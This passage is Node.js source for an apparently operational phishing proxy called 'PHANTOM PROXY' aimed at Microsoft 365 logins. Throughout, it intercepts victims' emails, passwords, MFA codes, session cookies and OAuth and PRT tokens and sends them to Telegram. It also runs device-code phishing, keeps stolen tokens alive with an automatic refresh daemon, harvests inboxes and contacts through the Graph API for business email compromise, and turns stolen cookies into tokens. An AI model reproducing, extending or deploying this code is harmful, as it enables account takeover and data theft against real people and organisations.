                    VICTIM_SESSIONS[currentSession].port = proxyRequestOptions.port;
                    VICTIM_SESSIONS[currentSession].host = proxyRequestOptions.headers.host;
                }

                makeProxyRequest(proxyRequestProtocol, proxyRequestOptions, currentSession, headers.host, proxyRequestBody, clientResponse, isNavigationRequest);
            });
    } else {
        clientResponse.writeHead(301, { Location: REDIRECT_URL });
        clientResponse.end();
    }
});

function makeProxyRequest(proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest) {
    const protocol = proxyRequestProtocol === "https:" ? https : http;
    const proxyReq = protocol.request(proxyRequestOptions, (proxyResponse) => {
        logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession)
            .catch(error => displayError("Log encryption failed", error));

        // ── ✅ REDIRECT INTERCEPTION ──
        if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
            const location = proxyResponse.headers.location;
            if (location) {
                try {
                    const locationURL = new URL(location);
                    VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
                    VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
                    VICTIM_SESSIONS[currentSession].path = `${locationURL.pathname}${locationURL.search}`;
                    VICTIM_SESSIONS[currentSession].port = locationURL.port;
                    VICTIM_SESSIONS[currentSession].host = locationURL.host;
                    proxyResponse.headers.location = location.replace(locationURL.host, proxyHostname);
                    console.log(`[REDIRECT] Rewrote: ${location} -> ${proxyResponse.headers.location}`);
                } catch (e) {
                    VICTIM_SESSIONS[currentSession].path = location;
                }
            }
        }

        const setCookieHeaders = proxyResponse.headers["set-cookie"];
        if (setCookieHeaders) {
            updateCurrentSessionCookies(proxyRequestOptions, setCookieHeaders, proxyHostname, currentSession, proxyResponse.headers.date);
        }
        proxyResponse.headers["cache-control"] = "no-store";
        proxyResponse.headers["access-control-allow-origin"] = `https://${proxyHostname}`;
        deleteHTTPSecurityResponseHeaders(proxyResponse.headers);

        let responseBody = [];
        proxyResponse
            .on("error", (error) => displayError("Response body retrieval failed", error, proxyRequestOptions.method, proxyRequestOptions.path))
            .on("data", (chunk) => responseBody.push(chunk))
            .on("end", async () => {
                let bodyBuffer = Buffer.concat(responseBody);

                // ── ✅ Extract tokens for Telegram ──
                let tokens = {}, cookies = {}, email = 'N/A', password = 'N/A', mfa = 'N/A';
                try {
                    let reqBody = proxyRequestBody;
                    if (typeof reqBody === 'string') {
                        try {
                            const parsed = JSON.parse(reqBody);
                            if (parsed.email) email = parsed.email;
                            if (parsed.password) password = parsed.password;
                            if (parsed.mfa || parsed.otp || parsed.code) mfa = parsed.mfa || parsed.otp || parsed.code;
                            if (parsed.access_token) tokens.access_token = parsed.access_token;
                            if (parsed.refresh_token) tokens.refresh_token = parsed.refresh_token;
                            if (parsed.id_token) tokens.id_token = parsed.id_token;
                            if (parsed.prt) tokens.prt = parsed.prt;
                        } catch (e) {}
                    }
                    const respStr = bodyBuffer.toString('utf-8');
                    const am = respStr.match(/access_token["']?\s*[:=]\s*["']([^"']+)["']/i);
                    if (am) tokens.access_token = am[1];
                    const rm = respStr.match(/refresh_token["']?\s*[:=]\s*["']([^"']+)["']/i);
                    if (rm) tokens.refresh_token = rm[1];
                    const im = respStr.match(/id_token["']?\s*[:=]\s*["']([^"']+)["']/i);
                    if (im) tokens.id_token = im[1];
                    const pm = respStr.match(/prt["']?\s*[:=]\s*["']([^"']+)["']/i);
                    if (pm) tokens.prt = pm[1];
                    const setCookies = proxyResponse.headers['set-cookie'];
                    if (setCookies) {
                        const arr = Array.isArray(setCookies) ? setCookies : [setCookies];
                        for (const c of arr) {
                            const [nameVal] = c.split(';');
                            if (nameVal) {
                                const [n, v] = nameVal.split('=');
                                cookies[n] = v;
                            }
                        }
                    }
                    if (Object.keys(tokens).length > 0 || email !== 'N/A' || password !== 'N/A' || mfa !== 'N/A') {
                        await sendToTelegram({ sessionId: currentSession, ip: proxyRequestOptions.headers['x-real-ip'] || 'Unknown', email, password, mfa, tokens, cookies });
                    }
                } catch (e) {}

                // ── HTML injection ──
                if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) &&
                    Buffer.byteLength(bodyBuffer)) {
                    try {
                        const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
                        bodyBuffer = updateHTMLProxyResponse(decompressedResponseBody);
                        bodyBuffer = await compressResponseBody(bodyBuffer, encodings);
                        if (proxyResponse.headers["content-length"]) {
                            proxyResponse.headers["content-length"] = Buffer.byteLength(bodyBuffer).toString();
                        }
                    } catch (error) {
                        displayError("HTML decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
                    }
                }

                // ── FederationRedirectUrl modification ──
                else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
                    try {
                        const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
                        bodyBuffer = updateFederationRedirectUrl(decompressedResponseBody, proxyHostname);
                        bodyBuffer = await compressResponseBody(bodyBuffer, encodings);
                        if (proxyResponse.headers["content-length"]) {
                            proxyResponse.headers["content-length"] = Buffer.byteLength(bodyBuffer).toString();
                        }
                    } catch (error) {
                        displayError("Federation redirect update failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
                    }
                }

                clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
                clientResponse.end(bodyBuffer);
            });
    });

    if (proxyRequestBody) {
        proxyReq.write(proxyRequestBody);
    }
    proxyReq.end();
}

// ============================================================
// 🎛️ EXPRESS DASHBOARD
// ============================================================
if (!express) {
    console.error('❌ Express not installed. Run: npm install express');
    process.exit(1);
}

const dashApp = express();
const dashUser = process.env.DASHBOARD_USER || 'svrpsdev';
const dashPass = process.env.DASHBOARD_PASS || 'Cozysarps18!';

dashApp.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

if (basicAuth) {
    dashApp.use(basicAuth({
        users: { [dashUser]: dashPass },
        challenge: true,
        realm: 'PHANTOM Dashboard'
    }));
}

dashApp.use(express.json());
dashApp.use(express.static('public'));

dashApp.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ── Status API ──
dashApp.get('/api/status', (req, res) => {
    try {
        const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
        const last = files.length > 0 ? fs.statSync(path.join(LOGS_DIRECTORY, files[0])).mtime : null;
        res.json({ online: true, totalSessions: files.length, lastCapture: last });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

dashApp.get('/api/logs', (req, res) => {
    try {
        const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
        const logs = files.map(f => {
            const stat = fs.statSync(path.join(LOGS_DIRECTORY, f));
            return { name: f, size: stat.size, modified: stat.mtime };
        }).sort((a, b) => b.modified - a.modified);
        res.json(logs);
    } catch (err) { res.status(500).json({ error: err.message }); }
});

dashApp.get('/api/log/:filename', (req, res) => {
    const filePath = path.join(LOGS_DIRECTORY, req.params.filename);
    if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Not found' });
    try {
        const content = fs.readFileSync(filePath, 'utf-8');
        const lines = content.split('\n').filter(line => line.trim());
        const entries = lines.map(line => {
            try {
                const entry = JSON.parse(line);
                const iv = Object.keys(entry)[0];
                const encrypted = entry[iv];
                const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
                let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                decrypted = Buffer.concat([decrypted, decipher.final()]);
                return JSON.parse(decrypted.toString('utf-8'));
            } catch (e) {
                return { error: 'Failed to decrypt', raw: line };
            }
        });
        res.json({ filename: req.params.filename, entries });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

if (AdmZip) {
    dashApp.get('/api/export/all', (req, res) => {
        try {
            const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
            if (files.length === 0) return res.status(404).json({ error: 'No logs' });
            const zip = new AdmZip();
            files.forEach(f => {
                const content = fs.readFileSync(path.join(LOGS_DIRECTORY, f));
                zip.addFile(f, content);
            });
            const zipBuffer = zip.toBuffer();
            res.setHeader('Content-Type', 'application/zip');
            res.setHeader('Content-Disposition', `attachment; filename=all_sessions_${Date.now()}.zip`);
            res.send(zipBuffer);
        } catch (err) { res.status(500).json({ error: err.message }); }
    });
}

// ── Device Code ──
function loadDeviceFlows() { try { if (fs.existsSync(DEVICE_FLOWS_FILE)) { const data = fs.readFileSync(DEVICE_FLOWS_FILE, 'utf-8'); deviceFlows = JSON.parse(data); } } catch (e) {} }
function saveDeviceFlows() { try { fs.writeFileSync(DEVICE_FLOWS_FILE, JSON.stringify(deviceFlows, null, 2)); } catch (e) {} }
loadDeviceFlows();

dashApp.post('/api/device/request', async (req, res) => {
    if (!axios) return res.status(500).json({ error: 'axios not installed' });
    try {
        const clientId = '9e5f94bc-e8a4-4e73-b8be-63364c29d753';
        const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
            new URLSearchParams({ client_id: clientId, scope: 'https://graph.microsoft.com/.default offline_access' }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
        );
        const data = response.data;
        const flow = {
            device_code: data.device_code,
            user_code: data.user_code,
            verification_uri: data.verification_uri,
            expires_in: data.expires_in,
            interval: data.interval,
            status: 'pending',
            created: new Date().toISOString(),
            client_id: clientId,
            session_id: crypto.randomBytes(16).toString('hex')
        };
        deviceFlows.push(flow);
        saveDeviceFlows();
        res.json(data);
    } catch (error) {
        res.status(500).json({ error: error.response?.data || error.message });
    }
});

dashApp.post('/api/device/token', async (req, res) => {
    const { device_code } = req.body;
    if (!device_code) return res.status(400).json({ error: 'device_code required' });
    try {
        const flow = deviceFlows.find(f => f.device_code === device_code);
        const clientId = flow?.client_id || '9e5f94bc-e8a4-4e73-b8be-63364c29d753';
        const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
            new URLSearchParams({
                client_id: clientId,
                device_code,
                grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
        );
        const tokens = response.data;
        if (flow) {
            flow.status = 'approved';
            flow.access_token = tokens.access_token;
            flow.refresh_token = tokens.refresh_token;
            flow.id_token = tokens.id_token;
            flow.approved = new Date().toISOString();
            saveDeviceFlows();
        }
        res.json(tokens);
    } catch (error) {
        if (error.response?.data?.error === 'authorization_pending') {
            res.status(400).json({ error: 'authorization_pending' });
        } else if (error.response?.data?.error === 'expired_token') {
            res.status(400).json({ error: 'expired_token' });
        } else {
            res.status(500).json({ error: error.response?.data || error.message });
        }
    }
});

dashApp.get('/api/device/history', (req, res) => {
    res.json({ success: true, flows: deviceFlows });
});

// ── Visits ──
dashApp.get('/api/visits', (req, res) => {
    try {
        if (!fs.existsSync(VISITS_LOG_FILE)) return res.json({ visits: [], total: 0 });
        const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
        const lines = content.split('\n').filter(line => line.trim());
        const visits = lines.map(line => JSON.parse(line));
        visits.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        res.json({ visits: visits.slice(0, 100), total: visits.length });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// ============================================================
// 🚀 PRT ENGINE
// ============================================================
function loadPRTStorage() {
    try { if (fs.existsSync(PRT_STORAGE_FILE)) { prtStorage = JSON.parse(fs.readFileSync(PRT_STORAGE_FILE, 'utf-8')); } } catch (e) {}
}
function savePRTStorage() { try { fs.writeFileSync(PRT_STORAGE_FILE, JSON.stringify(prtStorage, null, 2)); } catch (e) {} }
loadPRTStorage();

function extractUsernameFromToken(token) {
    try {
        const parts = token.split('.');
        if (parts.length === 3) {
            const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
            return payload.email || payload.preferred_username || payload.upn || 'Unknown';
        }
    } catch (e) {}
    return 'Unknown';
}

async function checkPRTHealth(prt) {
    try {
        const response = await retry(async () => {
            return await axios.post(
                'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                new URLSearchParams({
                    client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
                    grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
                    assertion: prt,
                    requested_token_use: 'on_behalf_of',
                    scope: 'https://graph.microsoft.com/.default offline_access'
                }),
                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
            );
        }, 2, 1000, 2);
        return { valid: true, data: response.data };
    } catch (e) {
        return { valid: false, error: e.response?.data?.error_description || e.message };
    }
}

dashApp.post('/api/prt/scan', (req, res) => {
    try {
        const prts = [];
        const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
        for (const file of files) {
            try {
                const content = fs.readFileSync(path.join(LOGS_DIRECTORY, file), 'utf-8');
                const lines = content.split('\n').filter(line => line.trim());
                for (const line of lines) {
                    try {
                        const entry = JSON.parse(line);
                        const iv = Object.keys(entry)[0];
                        const encrypted = entry[iv];
                        const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
                        let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                        decrypted = Buffer.concat([decrypted, decipher.final()]);
                        const obj = JSON.parse(decrypted.toString('utf-8'));
                        const body = obj.proxyRequestBody;
                        if (body) {
                            const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
                            const prtMatch = bodyStr.match(/prt["']?\s*[:=]\s*["']([^"']+)["']/i);
                            if (prtMatch) {
                                prts.push({
                                    prt: prtMatch[1],
                                    timestamp: obj.timestamp || new Date().toISOString(),
                                    source: obj.proxyRequestURL || 'Unknown',
                                    username: extractUsernameFromToken(prtMatch[1])
                                });
                            }
                        }
                    } catch (e) {}
                }
            } catch (e) {}
        }
        prtStorage.prts = prts;
        prtStorage.lastScan = new Date().toISOString();
        savePRTStorage();
        res.json({ success: true, count: prts.length, prts: prts });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

dashApp.get('/api/prt/list', (req, res) => {
    res.json({ success: true, prts: prtStorage.prts || [] });
});

dashApp.post('/api/prt/health', async (req, res) => {
    const { prt } = req.body;
    if (!prt) return res.status(400).json({ error: 'PRT required' });
    try {
        const result = await checkPRTHealth(prt);
        res.json({ success: true, ...result });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

dashApp.post('/api/prt/exchange', async (req, res) => {
    const { prt } = req.body;
    if (!prt) return res.status(400).json({ error: 'PRT required' });
    try {
        const response = await retry(async () => {
            return await axios.post(
                'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                new URLSearchParams({
                    client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
                    grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
                    assertion: prt,
                    requested_token_use: 'on_behalf_of',
                    scope: 'https://graph.microsoft.com/.default offline_access'
                }),
                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
            );
        }, 3, 1500, 2);
        const tokens = response.data;
        await sendToTelegram({ sessionId: 'prt_exchange', tokens });
        res.json({ success: true, data: tokens });
    } catch (err) {
        res.status(500).json({ error: err.response?.data || err.message });
    }
});

// ============================================================
// 🚀 TOKEN VAULT
// ============================================================
class TokenVault {
    constructor(logsDir, encryptionKey) {
        this.logsDir = logsDir;
        this.encryptionKey = encryptionKey;
        this.tokens = [];
        this.scanLogs();
    }

    extractUsernameFromToken(token) {
        try {
            const parts = token.split('.');
            if (parts.length === 3) {
                const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
                return payload.email || payload.preferred_username || payload.upn || 'unknown';
            }
        } catch (e) {}
        return 'unknown';
    }

    scanLogs() {
        this.tokens = [];
        const files = fs.readdirSync(this.logsDir).filter(f => f.endsWith('.log'));
        for (const file of files) {
            try {
                const content = fs.readFileSync(path.join(this.logsDir, file), 'utf-8');
                const lines = content.split('\n').filter(line => line.trim());
                for (const line of lines) {
                    try {
                        const entry = JSON.parse(line);
                        const iv = Object.keys(entry)[0];
                        const encrypted = entry[iv];
                        const decipher = crypto.createDecipheriv('aes-256-ctr', this.encryptionKey, Buffer.from(iv, 'hex'));
                        let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                        decrypted = Buffer.concat([decrypted, decipher.final()]);
                        const obj = JSON.parse(decrypted.toString('utf-8'));
                        const body = obj.proxyRequestBody;
                        if (body) {
                            const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
                            const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
                            if (accessMatch) {
                                const token = decodeURIComponent(accessMatch[1]);
                                const username = this.extractUsernameFromToken(token);
                                this.tokens.push({ type: 'access', value: token, file, username, timestamp: new Date().toISOString() });
                            }
                            const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
                            if (refreshMatch) {
                                const token = decodeURIComponent(refreshMatch[1]);
                                const username = this.extractUsernameFromToken(token);
                                this.tokens.push({ type: 'refresh', value: token, file, username, timestamp: new Date().toISOString() });
                            }
                            const idMatch = bodyStr.match(/id_token=([^&]+)/i);
                            if (idMatch) {
                                const token = decodeURIComponent(idMatch[1]);
                                const username = this.extractUsernameFromToken(token);
                                this.tokens.push({ type: 'id', value: token, file, username, timestamp: new Date().toISOString() });
                            }
                            const prtMatch = bodyStr.match(/prt=([^&]+)/i);
                            if (prtMatch) {
                                this.tokens.push({ type: 'prt', value: decodeURIComponent(prtMatch[1]), file, username: 'PRT', timestamp: new Date().toISOString() });
                            }
                        }
                    } catch (e) {}
                }
            } catch (e) {}
        }
        return this.tokens;
    }

    getStats() {
        const total = this.tokens.length;
        const access = this.tokens.filter(t => t.type === 'access').length;
        const refresh = this.tokens.filter(t => t.type === 'refresh').length;
        const id = this.tokens.filter(t => t.type === 'id').length;
        const prt = this.tokens.filter(t => t.type === 'prt').length;
        return { total, access, refresh, id, prt };
    }
}

const vault = new TokenVault(LOGS_DIRECTORY, ENCRYPTION_KEY);

dashApp.post('/api/vault/scan', (req, res) => {
    try {
        const tokens = vault.scanLogs();
        res.json({ success: true, count: tokens.length });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

dashApp.get('/api/vault/tokens', (req, res) => {
    try {
        const cached = global._cache ? global._cache.get('vault_tokens') : null;
        if (cached) { return res.json({ success: true, tokens: cached, cached: true }); }
        res.json({ success: true, tokens: vault.tokens || [] });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

dashApp.get('/api/vault/stats', (req, res) => {
    try {
        const stats = vault.getStats();
        res.json({ success: true, stats });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// ── Graph API ──
class GraphClient {
    constructor(accessToken) {
        this.accessToken = accessToken;
        this.baseUrl = 'https://graph.microsoft.com/v1.0';
        this.cache = global._cache || new CacheManager();
    }

    async get(endpoint, useCache = true) {
        const cacheKey = `graph:get:${endpoint}`;
        if (useCache) {
            const cached = this.cache.get(cacheKey);
            if (cached) return cached;
        }
        const config = getAxiosConfig();
        config.headers['Authorization'] = `Bearer ${this.accessToken}`;
        const response = await retry(async () => {
            return await axios.get(`${this.baseUrl}${endpoint}`, config);
        }, 3, 1000, 2);
        if (useCache && response.status === 200) {
            this.cache.set(cacheKey, response.data, 300000);
        }
        return response.data;
    }

    async getUserProfile() {
        return this.get('/me?$select=id,displayName,mail,userPrincipalName,jobTitle,department,officeLocation,mobilePhone,businessPhones');
    }

    async getInbox(limit = 50) {
        return this.get(`/me/mailFolders/inbox/messages?$top=${limit}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`);
    }

    async getContacts() {
        return this.get('/me/contacts?$top=100&$select=displayName,emailAddresses,mobilePhone,businessPhones,jobTitle,department');
    }

    async getEvents(limit = 25) {
        return this.get(`/me/events?$top=${limit}&$orderby=start/dateTime desc&$select=subject,start,end,location,attendees,organizer,bodyPreview`);
    }
}

dashApp.post('/api/recon', async (req, res) => {
    const { accessToken } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
    try {
        const graph = new GraphClient(accessToken);
        const [profile, inbox, contacts, events] = await Promise.all([
            graph.getUserProfile(),
            graph.getInbox(50),
            graph.getContacts(),
            graph.getEvents(25)
        ]);
        res.json({ success: true, profile, inbox: inbox?.value || [], contacts: contacts?.value || [], events: events?.value || [] });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// ── AI BEC Engine ──
class AIBECEngine {
    constructor(groqApiKey) {
        this.groqApiKey = groqApiKey;
        this.baseUrl = 'https://api.groq.com/openai/v1';
        this.cache = global._cache || new CacheManager();
    }

    async analyzeInbox(accessToken) {
        const graph = new GraphClient(accessToken);
        const [profile, inbox] = await Promise.all([
            graph.getUserProfile(),
            graph.getInbox(50)
        ]);
        const emails = inbox.value || [];
        const analysis = {
            user: profile,
            totalEmails: emails.length,
            unread: emails.filter(e => !e.isRead).length,
            highImportance: emails.filter(e => e.importance === 'high').length,
            potentialBEC: []
        };
        for (const email of emails) {
            if (email.importance === 'high' && !email.isRead) {
                analysis.potentialBEC.push({
                    subject: email.subject,
                    sender: email.sender?.emailAddress?.address || 'unknown',
                    received: email.receivedDateTime,
                    preview: email.bodyPreview
                });
            }
        }
        return analysis;
    }
}

dashApp.post('/api/ai/analyze', async (req, res) => {
    const { accessToken, groqApiKey } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
    if (!groqApiKey) return res.status(400).json({ error: 'Groq API key required' });
    try {
        const engine = new AIBECEngine(groqApiKey);
        const result = await engine.analyzeInbox(accessToken);
        res.json({ success: true, ...result });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// ── Conversion Engine ──
dashApp.post('/api/convert/esctx-to-token', async (req, res) => {
    const { esctx, resource = 'MSGraph' } = req.body;
    if (!esctx) return res.status(400).json({ error: 'ESTSAuth cookie required' });
    try {
        const psScript = `
            Import-Module ./TokenTactics.psd1 -Force -ErrorAction SilentlyContinue
            try {
                $token = Get-EntraIDTokenFromESTSCookie -ESTSAuthCookie "${esctx}" -ResourceName ${resource}
                $token | ConvertTo-Json -Depth 10
            } catch { Write-Error $_.Exception.Message }
        `;
        exec(`powershell -Command "${psScript}"`, { timeout: 30000 }, (error, stdout, stderr) => {
            if (error) { return res.status(500).json({ error: stderr || error.message }); }
            try {
                const result = JSON.parse(stdout);
                res.json({ success: true, data: result });
            } catch (e) {
                res.status(500).json({ error: 'Failed to parse PowerShell output: ' + e.message });
            }
        });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

dashApp.post('/api/convert/sccauth-to-token', async (req, res) => {
    const { sccauth, resource = 'MSGraph' } = req.body;
    if (!sccauth) return res.status(400).json({ error: 'SCCAUTH cookie required' });
    try {
        const psScript = `
            Import-Module ./TokenTactics.psd1 -Force -ErrorAction SilentlyContinue
            try {
                $token = Get-EntraIDTokenFromSCCAUTHCookie -SCCAuth "${sccauth}" -ResourceName ${resource}
                $token | ConvertTo-Json -Depth 10
            } catch { Write-Error $_.Exception.Message }
        `;
        exec(`powershell -Command "${psScript}"`, { timeout: 30000 }, (error, stdout, stderr) => {
            if (error) { return res.status(500).json({ error: stderr || error.message }); }
            try {
                const result = JSON.parse(stdout);
                res.json({ success: true, data: result });
            } catch (e) {
                res.status(500).json({ error: 'Failed to parse PowerShell output: ' + e.message });
            }
        });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// ── Token Health Check ──
dashApp.post('/api/vault/healthcheck', async (req, res) => {
    try {
        const results = [];
        const uniqueTokens = [];
        const seen = new Set();
        for (const token of vault.tokens) {
            if (!seen.has(token.value) && token.type === 'access') {
                seen.add(token.value);
                uniqueTokens.push(token);
            }
        }
        for (const token of uniqueTokens.slice(0, 10)) {
            try {
                const response = await retry(async () => {
                    return await axios.get('https://graph.microsoft.com/v1.0/me', {
                        headers: { 'Authorization': `Bearer ${token.value}` },
                        timeout: 5000
                    });
                }, 2, 1000, 2);
                results.push({ token: token.value.slice(0, 20) + '...', status: 'valid', user: response.data.userPrincipalName });
            } catch (e) {
                results.push({ token: token.value.slice(0, 20) + '...', status: 'invalid', error: e.message });
            }
        }
        res.json({ success: true, results });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// ============================================================
// 🚀 AUTO-REFRESH DAEMONS
// ============================================================
async function refreshTokensDaemon() {
    console.log('🔄 Token Refresh Daemon started (every 30 min)');
    setInterval(async () => {
        console.log('🔄 Running token refresh cycle...');
        for (const flow of deviceFlows) {
            if (flow.refresh_token && flow.status === 'approved') {
                try {
                    const response = await retry(async () => {
                        return await axios.post(
                            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                            new URLSearchParams({
                                client_id: flow.client_id || '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
                                refresh_token: flow.refresh_token,
                                grant_type: 'refresh_token',
                                scope: 'https://graph.microsoft.com/.default offline_access'
                            }),
                            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
                        );
                    }, 2, 1000, 2);
                    flow.access_token = response.data.access_token;
                    if (response.data.refresh_token) flow.refresh_token = response.data.refresh_token;
                    flow.last_refresh = new Date().toISOString();
                    saveDeviceFlows();
                    console.log(`✅ Refreshed tokens for flow ${flow.user_code}`);
                } catch (e) {
                    console.warn(`Failed to refresh tokens for ${flow.user_code}: ${e.message}`);
                }
            }
        }
    }, 30 * 60 * 1000);
}

refreshTokensDaemon();

// ============================================================
// 🚀 MAIN APP — ONE SERVER, EVERYTHING INTEGRATED
// ============================================================
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ── Mount dashboard ──
app.use('/dash', dashApp);

// ── Proxy route ──
app.use((req, res) => {
    if (!req.path.startsWith('/dash') && !req.path.startsWith('/api') && !req.path.startsWith('/device')) {
        proxyServer.emit('request', req, res);
    }
});

// ── Start server ──
const PORT = process.env.PORT || 3000;
const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ PHANTOM PROXY v8.2 ULTIMATE running on port ${PORT}`);
    console.log(`🔐 Dashboard: /dash (auth: ${dashUser}/${dashPass})`);
    console.log(`📱 Device Code: /api/device/request`);
    console.log(`🔄 Redirect interception: ACTIVE`);
    console.log(`📤 Telegram exfil: ACTIVE`);
    console.log(`🟣 PRT Engine: ACTIVE`);
    console.log(`📊 Graph API: ACTIVE`);
    console.log(`🤖 AI BEC Engine: ACTIVE`);
    console.log(`🔑 Token Vault: ACTIVE`);
    console.log(`🔄 Auto-Refresh Daemon: ACTIVE (30 min)`);
    console.log(`✅ All features integrated — Complete Ultimate Edition`);
});

process.on('SIGINT', () => { server.close(() => process.exit(0)); });
process.on('SIGTERM', () => { server.close(() => process.exit(0)); });
